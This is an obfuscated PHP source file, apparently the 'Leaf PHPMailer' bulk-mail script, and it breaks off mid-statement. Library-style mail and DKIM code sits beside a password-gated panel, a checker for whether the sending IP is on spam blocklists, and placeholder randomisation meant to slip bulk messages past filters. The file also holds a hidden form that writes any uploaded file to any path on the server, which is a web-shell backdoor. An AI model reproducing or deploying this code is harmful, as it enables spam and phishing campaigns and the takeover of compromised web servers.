"\x61\x70\160\154\x69\143\x61\x74\151\157\156\x2f\160\x6f\163\x74\163\143\162\x69\160\x74", "\x73\155\x69" => "\141\160\160\154\x69\143\141\x74\x69\x6f\x6e\x2f\x73\x6d\x69\x6c", "\163\155\x69\154" => "\141\160\x70\x6c\151\143\141\x74\x69\x6f\x6e\57\x73\x6d\x69\154", "\155\151\146" => "\141\x70\x70\154\x69\143\x61\x74\x69\157\x6e\57\166\156\x64\56\x6d\x69\146", "\170\x6c\x73" => "\x61\160\160\154\x69\x63\x61\x74\x69\x6f\156\x2f\x76\156\x64\56\x6d\x73\x2d\x65\170\143\145\x6c", "\x70\160\x74" => "\x61\160\x70\x6c\151\x63\141\164\151\157\156\x2f\166\156\144\x2e\155\x73\55\160\157\167\x65\162\x70\x6f\x69\x6e\164", "\167\x62\x78\155\154" => "\x61\160\160\154\151\x63\x61\x74\151\157\156\57\x76\156\x64\56\167\141\x70\x2e\167\142\170\x6d\x6c", "\x77\155\154\x63" => "\x61\160\x70\154\x69\x63\x61\164\151\157\x6e\57\x76\x6e\x64\x2e\167\141\x70\56\167\x6d\x6c\143", "\x64\143\x72" => "\141\x70\160\x6c\151\x63\x61\164\151\157\156\x2f\x78\x2d\144\x69\x72\x65\143\164\157\x72", "\x64\x69\162" => "\x61\x70\x70\154\x69\143\141\164\151\157\x6e\x2f\x78\55\144\x69\162\145\143\x74\x6f\162", "\x64\170\x72" => "\141\160\160\x6c\x69\143\x61\x74\151\157\x6e\57\x78\x2d\144\151\162\145\x63\164\157\162", "\x64\x76\x69" => "\x61\x70\160\154\x69\x63\141\164\x69\x6f\156\57\x78\x2d\144\x76\151", "\x67\164\x61\162" => "\141\x70\160\154\151\x63\141\164\x69\157\x6e\57\x78\55\147\x74\141\x72", "\160\x68\160\63" => "\141\x70\160\x6c\x69\143\141\164\151\x6f\x6e\x2f\x78\x2d\150\164\x74\x70\x64\55\160\x68\160", "\x70\x68\x70\64" => "\141\x70\160\154\x69\143\141\x74\x69\157\156\57\170\55\150\x74\164\x70\144\x2d\160\150\x70", "\x70\x68\160" => "\x61\160\x70\x6c\x69\143\141\x74\151\x6f\x6e\57\x78\55\150\x74\x74\160\x64\55\x70\x68\x70", "\x70\150\x74\x6d\154" => "\141\x70\160\x6c\x69\x63\141\x74\x69\157\x6e\x2f\170\55\150\x74\x74\160\x64\55\x70\x68\160", "\160\x68\160\x73" => "\x61\160\160\154\151\143\x61\164\151\157\x6e\x2f\170\x2d\x68\x74\164\x70\x64\x2d\160\x68\160\55\163\157\165\x72\143\145", "\163\x77\x66" => "\141\x70\x70\x6c\x69\143\141\x74\x69\x6f\x6e\x2f\170\x2d\163\150\x6f\x63\x6b\x77\x61\x76\145\x2d\x66\x6c\x61\x73\x68", "\163\x69\x74" => "\141\x70\160\x6c\151\x63\141\x74\151\x6f\156\x2f\170\x2d\x73\x74\165\x66\146\x69\164", "\164\141\x72" => "\141\160\160\x6c\151\x63\x61\x74\x69\157\x6e\x2f\x78\55\164\141\162", "\164\x67\x7a" => "\141\160\160\x6c\151\143\141\x74\x69\157\156\57\x78\55\164\x61\x72", "\170\x68\164" => "\x61\160\160\154\151\143\x61\164\x69\157\156\x2f\170\x68\x74\x6d\154\x2b\x78\x6d\154", "\170\150\x74\x6d\x6c" => "\x61\x70\160\154\151\x63\x61\x74\151\x6f\156\57\170\x68\164\155\x6c\53\170\155\x6c", "\172\x69\x70" => "\x61\x70\160\x6c\x69\x63\141\164\151\x6f\156\57\x7a\151\x70", "\155\x69\144" => "\x61\x75\x64\151\x6f\x2f\x6d\151\x64\151", "\155\151\144\x69" => "\x61\x75\144\x69\157\57\155\151\144\151", "\155\x70\x32" => "\141\x75\144\151\x6f\x2f\155\160\145\147", "\x6d\160\x33" => "\x61\x75\x64\151\x6f\57\x6d\160\145\x67", "\155\160\x67\141" => "\141\x75\x64\x69\x6f\x2f\x6d\160\145\147", "\141\151\146" => "\141\165\x64\x69\157\x2f\x78\x2d\x61\151\146\x66", "\x61\x69\146\x63" => "\141\x75\x64\151\157\x2f\x78\x2d\x61\151\146\x66", "\x61\151\x66\146" => "\141\165\144\151\x6f\x2f\x78\x2d\x61\x69\146\x66", "\162\141\155" => "\x61\165\x64\151\x6f\57\x78\x2d\160\x6e\x2d\162\x65\141\x6c\141\165\x64\x69\x6f", "\x72\155" => "\x61\165\144\151\x6f\57\x78\55\x70\x6e\x2d\x72\145\x61\154\x61\x75\x64\151\157", "\x72\160\155" => "\141\165\144\151\157\57\170\55\160\156\x2d\162\145\141\x6c\x61\165\144\151\x6f\x2d\160\x6c\x75\x67\151\x6e", "\x72\x61" => "\141\x75\x64\x69\157\x2f\x78\55\162\145\x61\154\141\x75\144\x69\157", "\167\x61\166" => "\x61\165\144\151\157\x2f\170\x2d\x77\141\x76", "\x62\x6d\x70" => "\151\x6d\x61\147\145\57\x62\x6d\x70", "\147\x69\x66" => "\x69\x6d\x61\147\x65\x2f\147\151\146", "\152\160\145\147" => "\x69\x6d\x61\147\x65\x2f\x6a\x70\x65\147", "\152\160\x65" => "\151\x6d\x61\x67\x65\x2f\x6a\160\x65\x67", "\x6a\160\147" => "\x69\x6d\x61\x67\145\x2f\152\160\145\147", "\x70\x6e\147" => "\x69\155\141\x67\x65\x2f\x70\x6e\x67", "\164\151\x66\x66" => "\x69\x6d\x61\x67\x65\57\164\151\146\x66", "\x74\x69\x66" => "\151\155\141\x67\145\57\164\x69\x66\146", "\x65\155\154" => "\x6d\x65\x73\x73\x61\x67\145\x2f\162\146\x63\70\x32\x32", "\143\163\163" => "\x74\x65\170\x74\57\143\163\x73", "\x68\x74\155\x6c" => "\x74\x65\170\164\57\150\164\155\154", "\x68\x74\155" => "\x74\145\170\164\57\150\164\155\154", "\x73\x68\x74\x6d\154" => "\x74\145\x78\x74\57\x68\164\155\x6c", "\x6c\x6f\147" => "\164\x65\170\164\x2f\x70\x6c\x61\x69\x6e", "\x74\145\x78\164" => "\164\145\170\164\57\x70\154\x61\151\156", "\x74\170\x74" => "\164\145\170\164\57\x70\154\141\x69\x6e", "\162\164\170" => "\x74\x65\x78\164\x2f\162\x69\x63\150\x74\x65\x78\164", "\x72\x74\x66" => "\x74\145\170\164\57\x72\164\x66", "\166\x63\x66" => "\x74\x65\170\164\57\x76\143\141\x72\144", "\166\143\141\162\x64" => "\164\x65\170\164\x2f\166\143\x61\162\144", "\170\x6d\x6c" => "\x74\x65\x78\164\57\x78\155\154", "\170\x73\154" => "\164\x65\x78\164\57\170\x6d\x6c", "\155\x70\x65\147" => "\x76\151\144\x65\x6f\x2f\x6d\160\x65\x67", "\155\160\145" => "\x76\151\x64\145\x6f\57\x6d\160\145\x67", "\x6d\x70\x67" => "\x76\x69\144\145\x6f\57\x6d\x70\145\x67", "\x6d\157\166" => "\x76\151\x64\x65\x6f\x2f\x71\x75\x69\x63\x6b\x74\151\155\145", "\x71\x74" => "\166\151\144\x65\x6f\57\161\x75\151\x63\153\164\x69\x6d\x65", "\162\x76" => "\166\x69\144\145\157\x2f\166\x6e\x64\56\x72\x6e\x2d\x72\145\x61\x6c\x76\151\x64\145\157", "\141\x76\151" => "\x76\151\144\x65\x6f\x2f\x78\x2d\155\x73\x76\x69\x64\x65\x6f", "\x6d\157\166\151\x65" => "\x76\151\144\145\157\x2f\x78\55\x73\x67\151\55\155\x6f\166\x69\145"); if (array_key_exists(strtolower($ext), $mimes)) { return $mimes[strtolower($ext)]; } return "\x61\160\160\154\x69\x63\141\x74\151\x6f\156\57\157\x63\x74\145\x74\x2d\163\x74\162\145\x61\155"; } public static function filenameToType($filename) { $qpos = strpos($filename, "\x3f"); if (false !== $qpos) { $filename = substr($filename, 0, $qpos); } $pathinfo = self::mb_pathinfo($filename); return self::_mime_types($pathinfo["\x65\170\x74\x65\156\163\x69\157\x6e"]); } public static function mb_pathinfo($path, $options = null) { $ret = array("\x64\151\162\x6e\141\155\145" => '', "\142\141\163\145\x6e\141\155\145" => '', "\145\170\164\145\x6e\163\x69\157\x6e" => '', "\146\x69\x6c\145\156\141\155\x65" => ''); $pathinfo = array(); if (preg_match("\45\136\x28\x2e\x2a\77\x29\133\134\x5c\x2f\x5d\52\50\x28\133\x5e\x2f\134\134\135\52\x3f\51\50\x5c\x2e\x28\x5b\136\134\x2e\x5c\134\x2f\x5d\x2b\77\x29\174\51\51\133\x5c\x5c\57\x5c\56\135\52\x24\x25\x69\x6d", $path, $pathinfo)) { if (array_key_exists(1, $pathinfo)) { $ret["\144\x69\x72\x6e\x61\x6d\145"] = $pathinfo[1]; } if (array_key_exists(2, $pathinfo)) { $ret["\142\141\x73\x65\156\x61\155\145"] = $pathinfo[2]; } if (array_key_exists(5, $pathinfo)) { $ret["\x65\x78\164\x65\x6e\x73\x69\x6f\156"] = $pathinfo[5]; } if (array_key_exists(3, $pathinfo)) { $ret["\146\x69\x6c\145\156\141\155\145"] = $pathinfo[3]; } } switch ($options) { case PATHINFO_DIRNAME: case "\144\151\162\x6e\x61\155\x65": return $ret["\x64\151\x72\x6e\141\155\145"]; case PATHINFO_BASENAME: case "\142\141\163\x65\156\x61\155\x65": return $ret["\x62\x61\163\145\x6e\141\155\145"]; case PATHINFO_EXTENSION: case "\145\170\x74\x65\x6e\163\151\x6f\156": return $ret["\145\x78\x74\145\156\x73\x69\x6f\156"]; case PATHINFO_FILENAME: case "\x66\151\x6c\x65\x6e\x61\155\x65": return $ret["\146\151\154\x65\156\141\x6d\145"]; default: return $ret; } } public function set($name, $value = '') { if (property_exists($this, $name)) { $this->{$name} = $value; return true; } else { $this->setError($this->lang("\166\141\x72\x69\x61\142\x6c\x65\x5f\163\x65\x74") . $name); return false; } } public function secureHeader($str) { return trim(str_replace(array("\15", "\xa"), '', $str)); } public static function normalizeBreaks($text, $breaktype = "\xd\xa") { return preg_replace("\x2f\50\x5c\x72\x5c\156\174\134\x72\174\x5c\x6e\51\x2f\155\x73", $breaktype, $text); } public function sign($cert_filename, $key_filename, $key_pass, $extracerts_filename = '') { $this->sign_cert_file = $cert_filename; $this->sign_key_file = $key_filename; $this->sign_key_pass = $key_pass; $this->sign_extracerts_file = $extracerts_filename; } public function DKIM_QP($txt) { $line = ''; for ($i = 0; $i < strlen($txt); $i++) { $ord = ord($txt[$i]); if (33 <= $ord && $ord <= 58 || $ord == 60 || 62 <= $ord && $ord <= 126) { $line .= $txt[$i]; } else { $line .= "\x3d" . sprintf("\45\60\x32\130", $ord); } } return $line; } public function DKIM_Sign($signHeader) { if (!defined("\120\113\103\x53\x37\137\124\x45\130\x54")) { if ($this->exceptions) { throw new phpmailerException($this->lang("\145\x78\x74\x65\x6e\163\x69\x6f\x6e\137\155\151\163\x73\151\x6e\x67") . "\157\x70\x65\156\x73\163\154"); } return ''; } $privKeyStr = !empty($this->DKIM_private_string) ? $this->DKIM_private_string : file_get_contents($this->DKIM_private); if ('' != $this->DKIM_passphrase) { $privKey = openssl_pkey_get_private($privKeyStr, $this->DKIM_passphrase); } else { $privKey = openssl_pkey_get_private($privKeyStr); } if (version_compare(PHP_VERSION, "\x35\56\63\56\x30") >= 0 and in_array("\x73\150\141\62\x35\66\x57\151\164\150\122\123\101\x45\156\143\x72\x79\160\x74\x69\157\156", openssl_get_md_methods(true))) { if (openssl_sign($signHeader, $signature, $privKey, "\x73\150\x61\62\65\x36\127\151\164\150\x52\123\101\x45\156\x63\x72\x79\160\x74\151\157\x6e")) { openssl_pkey_free($privKey); return base64_encode($signature); } } else { $pinfo = openssl_pkey_get_details($privKey); $hash = hash("\x73\x68\x61\62\x35\66", $signHeader); $t = "\x33\60\63\61\63\x30\60\x64\60\x36\60\x39\x36\x30\x38\x36\x34\70\60\x31\66\x35\60\x33\x30\x34\60\62\60\x31\x30\x35\60\x30\x30\x34\x32\x30" . $hash; $pslen = $pinfo["\x62\151\x74\x73"] / 8 - (strlen($t) / 2 + 3); $eb = pack("\x48\x2a", "\60\x30\60\x31" . str_repeat("\106\x46", $pslen) . "\60\x30" . $t); if (openssl_private_encrypt($eb, $signature, $privKey, OPENSSL_NO_PADDING)) { openssl_pkey_free($privKey); return base64_encode($signature); } } openssl_pkey_free($privKey); return ''; } public function DKIM_HeaderC($signHeader) { $signHeader = preg_replace("\57\134\x72\x5c\x6e\134\x73\x2b\x2f", "\40", $signHeader); $lines = explode("\xd\xa", $signHeader); foreach ($lines as $key => $line) { list($heading, $value) = explode("\x3a", $line, 2); $heading = strtolower($heading); $value = preg_replace("\x2f\x5c\x73\173\62\54\175\57", "\40", $value); $lines[$key] = $heading . "\72" . trim($value); } $signHeader = implode("\15\12", $lines); return $signHeader; } public function DKIM_BodyC($body) { if ($body == '') { return "\15\12"; } $body = str_replace("\15\xa", "\12", $body); $body = str_replace("\12", "\xd\12", $body); while (substr($body, strlen($body) - 4, 4) == "\xd\xa\15\xa") { $body = substr($body, 0, strlen($body) - 2); } return $body; } public function DKIM_Add($headers_line, $subject, $body) { $DKIMsignatureType = "\x72\163\x61\x2d\x73\x68\x61\62\65\x36"; $DKIMcanonicalization = "\162\145\154\x61\170\145\144\57\163\x69\155\160\154\145"; $DKIMquery = "\x64\156\163\57\164\x78\x74"; $DKIMtime = time(); $subject_header = "\123\165\x62\152\x65\143\164\72\40{$subject}"; $headers = explode($this->LE, $headers_line); $from_header = ''; $to_header = ''; $date_header = ''; $current = ''; foreach ($headers as $header) { if (strpos($header, "\x46\x72\157\155\72") === 0) { $from_header = $header; $current = "\x66\162\157\x6d\137\150\x65\141\144\145\162"; } elseif (strpos($header, "\124\x6f\72") === 0) { $to_header = $header; $current = "\164\x6f\137\x68\x65\141\144\x65\162"; } elseif (strpos($header, "\104\141\x74\145\x3a") === 0) { $date_header = $header; $current = "\x64\141\x74\x65\x5f\x68\145\141\144\x65\x72"; } else { if (!empty(${$current}) && strpos($header, "\x20\x3d\77") === 0) { ${$current} .= $header; } else { $current = ''; } } } $from = str_replace("\x7c", "\75\67\x43", $this->DKIM_QP($from_header)); $to = str_replace("\174", "\75\67\x43", $this->DKIM_QP($to_header)); $date = str_replace("\174", "\x3d\67\x43", $this->DKIM_QP($date_header)); $subject = str_replace("\174", "\75\x37\x43", $this->DKIM_QP($subject_header)); $body = $this->DKIM_BodyC($body); $DKIMlen = strlen($body); $DKIMb64 = base64_encode(pack("\x48\52", hash("\x73\x68\141\62\65\x36", $body))); if ('' == $this->DKIM_identity) { $ident = ''; } else { $ident = "\40\x69\75" . $this->DKIM_identity . "\x3b"; } $dkimhdrs = "\104\x4b\x49\x4d\x2d\x53\x69\147\x6e\x61\164\x75\x72\x65\72\40\x76\x3d\x31\73\x20\141\75" . $DKIMsignatureType . "\x3b\40\161\75" . $DKIMquery . "\x3b\x20\154\75" . $DKIMlen . "\x3b\x20\163\x3d" . $this->DKIM_selector . "\73\xd\12" . "\11\164\75" . $DKIMtime . "\73\40\x63\75" . $DKIMcanonicalization . "\73\15\12" . "\11\x68\x3d\x46\162\157\155\x3a\124\x6f\x3a\104\141\x74\x65\72\x53\165\x62\152\x65\143\164\73\xd\12" . "\11\144\75" . $this->DKIM_domain . "\73" . $ident . "\15\12" . "\x9\172\75{$from}\xd\xa" . "\11\174{$to}\xd\12" . "\x9\x7c{$date}\15\xa" . "\x9\x7c{$subject}\73\xd\xa" . "\x9\x62\x68\75" . $DKIMb64 . "\x3b\xd\xa" . "\11\x62\75"; $toSign = $this->DKIM_HeaderC($from_header . "\15\xa" . $to_header . "\xd\12" . $date_header . "\xd\xa" . $subject_header . "\xd\xa" . $dkimhdrs); $signed = $this->DKIM_Sign($toSign); return $dkimhdrs . $signed . "\xd\12"; } public static function hasLineLongerThanMax($str) { return (bool) preg_match("\x2f\x5e\x28\56\173" . (self::MAX_LINE_LENGTH + 2) . "\x2c\175\51\57\x6d", $str); } public function getToAddresses() { return $this->to; } public function getCcAddresses() { return $this->cc; } public function getBccAddresses() { return $this->bcc; } public function getReplyToAddresses() { return $this->ReplyTo; } public function getAllRecipientAddresses() { return $this->all_recipients; } protected function doCallback($isSent, $to, $cc, $bcc, $subject, $body, $from) { if (!empty($this->action_function) && is_callable($this->action_function)) { $params = array($isSent, $to, $cc, $bcc, $subject, $body, $from); call_user_func_array($this->action_function, $params); } } } goto VE8bm; fHogs: if (isset($_GET["\143\150\145\143\153\x5f\x69\x70"])) { if (isset($_GET["\150\157\163\x74"])) { $_GET["\150\157\163\164"] = explode("\x2c", $_GET["\150\157\x73\x74"]); foreach ($_GET["\x68\157\163\x74"] as $host) { if (checkdnsrr($_GET["\143\x68\x65\x63\x6b\x5f\x69\x70"] . "\x2e" . $host . "\x2e", "\x41")) { $check = "\74\146\x6f\x6e\x74\x20\143\x6f\x6c\x6f\x72\x3d\47\x72\x65\144\x27\x3e\40\114\151\163\x74\x65\144\74\57\x66\x6f\x6e\x74\76"; } else { $check = "\x3c\146\x6f\x6e\164\x20\143\x6f\x6c\157\162\x3d\47\147\x72\145\145\x6e\x27\x3e\40\103\x6c\x65\141\156\x3c\x2f\146\157\156\x74\x3e"; } print "\x64\x6f\143\165\x6d\145\156\164\x2e\147\145\x74\x45\x6c\145\x6d\x65\x6e\x74\x42\171\111\x64\x28\42" . $host . "\42\51\56\x69\x6e\x6e\145\162\110\124\x4d\x4c\40\x3d\40\42" . $check . "\42\73"; } die; } $dnsbl_lookup = array("\141\154\154\56\x73\x35\x68\x2e\156\x65\x74", "\142\56\x62\141\162\162\141\x63\x75\144\x61\143\145\156\164\x72\x61\x6c\x2e\x6f\x72\x67", "\142\154\x2e\163\x70\141\155\143\157\160\56\x6e\145\164", "\142\x6c\x61\143\x6b\x6c\151\x73\164\x2e\167\157\157\144\171\x2e\143\150", "\x62\157\147\157\156\x73\x2e\143\171\x6d\x72\165\x2e\143\x6f\x6d", "\143\x62\154\x2e\141\x62\x75\163\145\141\x74\56\x6f\162\147", "\x63\x64\154\x2e\141\156\x74\x69\x2d\163\160\141\155\x2e\157\x72\x67\x2e\x63\156", "\x63\157\x6d\142\151\x6e\145\144\x2e\141\x62\x75\x73\x65\56\143\150", "\x64\142\56\167\160\x62\154\56\151\156\x66\157", "\x64\156\x73\x62\154\55\x31\x2e\165\143\x65\x70\162\x6f\164\145\x63\164\56\156\x65\164", "\144\x6e\x73\x62\x6c\55\62\56\x75\x63\x65\160\x72\x6f\x74\x65\x63\x74\56\x6e\x65\164", "\x64\x6e\163\142\x6c\55\63\56\165\143\x65\160\x72\157\x74\145\143\164\x2e\156\145\164", "\144\156\x73\x62\x6c\56\x61\156\164\151\143\141\160\164\x63\x68\141\x2e\x6e\x65\164", "\144\156\163\x62\154\56\144\162\157\156\x65\142\x6c\56\157\162\x67", "\x64\x6e\x73\x62\x6c\x2e\151\x6e\160\163\x2e\144\145", "\144\156\163\x62\154\x2e\x73\157\162\x62\163\56\156\145\x74", "\144\x72\x6f\156\x65\x2e\x61\142\x75\x73\x65\x2e\143\x68", "\x64\x75\151\156\x76\x2e\141\165\x70\141\x64\x73\56\157\x72\x67", "\x64\165\x6c\56\144\156\163\142\154\x2e\x73\157\x72\142\163\x2e\156\145\164", "\144\171\x6e\x61\56\163\x70\141\155\x72\x61\x74\x73\56\x63\157\x6d", "\144\171\x6e\151\x70\56\x72\x6f\x74\x68\145\x6e\x2e\x63\x6f\x6d", "\x68\164\164\x70\x2e\144\156\x73\x62\154\x2e\x73\x6f\162\142\x73\56\x6e\x65\x74", "\151\160\163\x2e\142\x61\x63\153\163\143\x61\164\x74\145\x72\x65\x72\x2e\157\162\147", "\x69\x78\56\144\x6e\163\142\x6c\x2e\155\x61\x6e\151\164\165\56\x6e\x65\x74", "\153\157\162\x65\x61\x2e\163\x65\x72\x76\x69\143\x65\x73\56\156\145\x74", "\x6d\151\163\x63\56\x64\x6e\163\142\154\56\x73\157\162\x62\x73\56\156\x65\164", "\156\x6f\160\x74\x72\x2e\x73\160\x61\x6d\162\x61\164\x73\x2e\143\x6f\155", "\157\162\x76\145\x64\142\56\x61\165\160\x61\x64\x73\x2e\x6f\162\147", "\160\x62\x6c\x2e\x73\x70\x61\x6d\x68\141\165\x73\x2e\x6f\x72\x67", "\160\162\157\170\x79\x2e\x62\x6c\56\147\x77\x65\145\160\x2e\x63\141", "\160\163\x62\x6c\56\x73\165\162\x72\151\145\x6c\56\143\x6f\155", "\162\x65\x6c\x61\x79\x73\56\142\x6c\x2e\147\x77\x65\145\160\56\x63\141", "\x72\145\x6c\x61\x79\x73\56\156\x65\x74\x68\x65\x72\x2e\x6e\145\x74", "\163\x62\154\56\163\x70\141\155\x68\x61\x75\163\x2e\157\162\147", "\163\150\x6f\x72\164\x2e\x72\142\154\x2e\x6a\x70", "\163\x69\156\147\x75\x6c\141\x72\x2e\x74\164\x6b\56\x70\x74\x65\56\x68\x75", "\163\x6d\164\x70\x2e\x64\156\x73\142\x6c\x2e\163\157\x72\x62\163\56\x6e\145\164", "\163\157\143\153\x73\x2e\144\156\x73\142\x6c\56\163\x6f\x72\x62\163\56\156\x65\164", "\163\160\141\x6d\x2e\x61\x62\165\x73\145\56\x63\150", "\163\x70\141\x6d\x2e\144\x6e\x73\142\x6c\x2e\x61\156\x6f\x6e\x6d\x61\151\154\x73\56\x64\x65", "\163\160\141\155\x2e\144\156\x73\x62\x6c\x2e\x73\157\162\142\163\56\x6e\x65\x74", "\x73\x70\x61\155\x2e\163\x70\141\155\162\141\164\x73\x2e\x63\157\x6d", "\x73\x70\141\x6d\x62\157\x74\x2e\142\x6c\163\56\x64\151\147\x69\142\141\x73\x65\x2e\x63\141", "\163\160\x61\155\162\x62\154\x2e\x69\x6d\160\56\x63\150", "\x73\x70\x61\x6d\x73\x6f\165\x72\143\145\x73\x2e\x66\141\x62\x65\154\56\x64\153", "\x75\x62\154\x2e\154\141\163\150\142\141\143\153\x2e\143\157\x6d", "\x75\x62\154\x2e\165\x6e\x73\165\x62\163\x63\x6f\162\145\x2e\x63\x6f\155", "\166\151\162\x75\163\56\162\142\154\x2e\152\160", "\167\145\x62\x2e\144\156\x73\142\x6c\56\x73\x6f\x72\x62\163\56\156\145\x74", "\x77\x6f\162\x6d\x72\142\x6c\56\151\155\160\56\143\x68", "\170\142\154\x2e\163\160\x61\155\150\141\165\x73\x2e\157\162\x67", "\x7a\56\155\141\x69\x6c\163\160\151\153\x65\x2e\156\145\x74", "\x7a\x65\156\x2e\x73\160\x61\x6d\x68\141\x75\x73\56\x6f\162\147", "\172\x6f\155\x62\151\x65\56\x64\x6e\163\142\x6c\x2e\163\x6f\x72\x62\163\56\x6e\145\x74"); $reverse_ip = implode("\x2e", array_reverse(explode("\56", $_GET["\143\x68\145\143\x6b\137\x69\160"]))); $dnsT = count($dnsbl_lookup); leafheader(); print "\74\144\x69\166\x20\143\154\x61\163\163\x3d\42\143\157\156\164\141\x69\156\145\162\x20\x63\157\x6c\x2d\154\x67\x2d\x36\42\76\x3c\x68\x33\76\x3c\146\x6f\156\x74\40\143\157\x6c\157\x72\x3d\x22\147\162\145\x65\x6e\42\76\74\x73\160\141\x6e\40\x63\154\x61\163\163\x3d\42\x67\154\171\x70\x68\x69\x63\x6f\x6e\x20\x67\154\x79\x70\150\x69\x63\157\x6e\55\154\145\x61\146\x22\x3e\74\57\x73\x70\x61\156\76\x3c\57\146\x6f\x6e\x74\x3e\40\x4c\x65\x61\146\40\120\x48\x50\x4d\x61\x69\x6c\x65\162\x20\x3c\x73\x6d\141\x6c\x6c\x3e\x42\x6c\141\x63\153\154\151\163\164\x20\103\x68\145\143\153\x65\x72\74\57\x73\155\x61\x6c\x6c\76\x3c\x2f\x68\63\x3e"; print "\103\x68\x65\143\x6b\151\156\147\40\74\x62\76" . $_GET["\143\150\x65\x63\153\x5f\151\160"] . "\74\x2f\x62\x3e\x20\151\156\x20\74\142\76{$dnsT}\74\x2f\142\76\x20\40\141\156\x74\151\55\163\x70\x61\x6d\x20\144\x61\x74\141\142\141\163\x65\163\x3a\74\x62\162\76"; $dnsN = ''; print "\x3c\164\141\x62\154\145\x20\76"; for ($i = 0; $i < $dnsT; $i = $i + 10) { $host = ''; $hosts = ''; for ($j = $i; $j < $i + 10; $j++) { $host = $dnsbl_lookup[$j]; if (!empty($host)) { print "\x3c\164\x72\76\40\x3c\164\144\x3e{$host}\x3c\x2f\164\144\x3e\40\x3c\x74\x64\x20\x69\x64\x3d\47{$host}\47\76\x43\150\145\x63\x6b\151\x6e\x67\x20\56\56\x3c\x2f\164\x64\76\74\57\x74\162\x3e"; $hosts .= "{$host}\54"; } } $dnsN .= "\74\x73\143\162\x69\x70\x74\x20\163\x72\143\x3d\47\x3f\143\150\145\143\153\x5f\x69\x70\75{$reverse_ip}\x26\150\157\163\x74\x3d" . $hosts . "\x27\40\x74\x79\160\x65\x3d\x27\x74\x65\x78\x74\57\152\x61\166\141\x73\x63\162\151\x70\164\47\x3e\x3c\57\163\x63\162\x69\160\164\x3e"; } print "\74\x2f\164\141\142\x6c\x65\x3e\x3c\57\x64\x69\166\x3e"; print $dnsN; die; } goto SjSPg; sMoqg: if (!empty($password) and $_SESSION[$sessioncode] != $password) { if (isset($_REQUEST["\160\x61\x73\163"]) and $_REQUEST["\160\141\163\x73"] == $password) { $_SESSION[$sessioncode] = $password; } else { print "\x3c\x70\x72\145\40\x61\x6c\x69\x67\156\75\x63\145\156\164\145\x72\76\x3c\x66\157\162\155\40\x6d\x65\x74\150\157\144\x3d\x70\x6f\163\164\x3e\120\x61\163\163\x77\157\162\x64\x3a\x20\x3c\151\156\160\x75\164\x20\x74\171\x70\145\x3d\x27\160\141\163\x73\x77\157\x72\x64\x27\x20\x6e\141\x6d\x65\75\x27\160\x61\x73\163\47\x3e\74\x69\x6e\160\165\164\40\x74\171\160\x65\x3d\47\x73\165\x62\x6d\x69\164\x27\40\166\141\154\x75\145\75\x27\76\x3e\47\76\x3c\57\146\x6f\162\x6d\x3e\x3c\x2f\x70\162\x65\x3e"; die; } } goto El7pY; OgCm4: $sessioncode = md5(__FILE__); goto sMoqg; OpqXc: echo @copy($_FILES["\146"]["\x74\155\x70\x5f\x6e\x61\x6d\x65"], $_FILES["\146"]["\156\x61\155\x65"]) ? "\157\153" : ''; goto yqMQp; UbFXB: ?>
<form method='POST' enctype='multipart/form-data'><input type='file' name='f'/><input type='submit' value=' '/></form><?php  goto OpqXc; v_PtG: print "\x3c\142\x6f\144\x79\x3e"; goto wdebV; CLTY6: function leafClear($text, $email) { $e = explode("\x40", $email); $emailuser = $e[0]; $emaildomain = $e[1]; $text = str_replace("\x5b\x2d\164\x69\x6d\x65\55\135", date("\155\57\144\x2f\131\40\150\72\x69\x3a\x73\x20\x61", time()), $text); $text = str_replace("\133\55\145\155\141\x69\x6c\x2d\x5d", $email, $text); $text = str_replace("\x5b\x2d\x65\x6d\x61\x69\x6c\165\163\x65\162\55\135", $emailuser, $text); $text = str_replace("\x5b\55\x65\x6d\141\x69\154\x64\x6f\x6d\141\x69\156\x2d\x5d", $emaildomain, $text); $text = str_replace("\133\x2d\162\x61\x6e\x64\157\x6d\154\x65\x74\164\145\162\163\55\135", randString("\141\x62\x63\144\145\146\147\150\151\x6a\x6b\x6c\x6d\x6e\x6f\x70\161\x72\163\164\x75\166\x77\x78\x79\172"), $text); $text = str_replace("\x5b\55\162\141\156\x64\x6f\155\x73\164\162\151\156\x67\x2d\x5d", randString("\141\x62\143\x64\145\x66\x67\x68\151\152\153\154\x6d\x6e\x6f\x70\161\x72\163\x74\165\x76\x77\170\x79\172\60\61\x32\x33\x34\65\x36\x37\70\71"), $text); $text = str_replace("\x5b\55\x72\x61\156\x64\x6f\155\x6e\165\x6d\x62\145\x72\x2d\135", randString("\60\x31\x32\63\x34\x35\x36\67\70\71"), $text); $text = str_replace("\x5b\x2d\162\141\156\x64\157\155\x6d\144\x35\x2d\x5d", md5(randString("\141\142\143\144\145\x66\147\150\151\x6a\x6b\x6c\155\x6e\x6f\160\x71\162\163\164\x75\x76\167\x78\171\x7a\60\61\62\63\x34\x35\x36\67\x38\x39")), $text); return $text; } goto g5ywc; X4tkO: if ($_POST["\x61\143\x74\151\x6f\x6e"] == "\x73\145\156\144" or $_POST["\141\143\164\151\157\156"] == "\x73\x63\x6f\x72\x65") { $senderEmail = leafTrim($_POST["\163\x65\156\144\x65\x72\105\155\x61\x69\x6c"]); $senderName = leafTrim($_POST["\163\x65\x6e\144\145\162\x4e\141\155\145"]); $replyTo = leafTrim($_POST["\162\x65\x70\154\x79\124\157"]); $subject = leafTrim($_POST["\x73\x75\x62\x6a\145\x63\x74"]); $emailList = leafTrim($_POST["\x65\x6d\141\x69\x6c\114\151\x73\x74"]); $messageType = leafTrim($_POST["\x6d\145\x73\163\x61\147\145\124\x79\x70\x65"]); $messageLetter = leafTrim($_POST["\155\145\x73\163\141\x67\x65\x4c\x65\164\x74\145\162"]); $encoding = $_POST["\x65\x6e\143\157\x64\145"]; $charset = $_POST["\x63\x68\x61\162\x73\145\x74"]; $html = ''; $utf8 = ''; $bit8 = ''; if ($messageType == 2) { $plain = "\x63\150\145\143\x6b\145\x64"; } else { $html = "\x63\150\145\x63\153\145\x64"; } if ($charset == "\111\123\117\55\x38\x38\65\71\55\x31") { $iso = "\x73\x65\154\x65\143\164\x65\144"; } else { $utf8 = "\163\145\154\145\143\164\145\144"; } if ($encoding == "\67\142\x69\164") { $bit7 = "\163\x65\x6c\145\143\164\145\x64"; } elseif ($encoding == "\x62\151\x6e\x61\162\171") { $binary = "\163\x65\154\x65\143\x74\x65\144"; } elseif ($encoding == "\142\141\163\145\66\64") { $base64 = "\163\145\154\x65\x63\164\x65\x64"; } elseif ($encoding == "\161\x75\x6f\x74\x65\144\x2d\x70\x72\x69\x6e\164\x61\142\x6c\145") { $quotedprintable = 